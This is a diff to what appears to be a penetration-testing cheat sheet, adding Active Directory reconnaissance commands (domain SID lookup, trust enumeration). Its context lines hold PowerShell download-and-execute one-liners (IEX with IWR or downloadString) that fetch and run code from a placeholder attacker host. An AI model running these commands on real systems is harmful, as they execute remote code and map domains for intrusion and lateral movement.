@@ -31,6 +31,8 @@ C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Cons
 IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
 iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
 IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
+Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID   # retrieve SID
+nltest /domain_trusts   # show inbound/outbound trust
 ```
 
 ### Metasploit
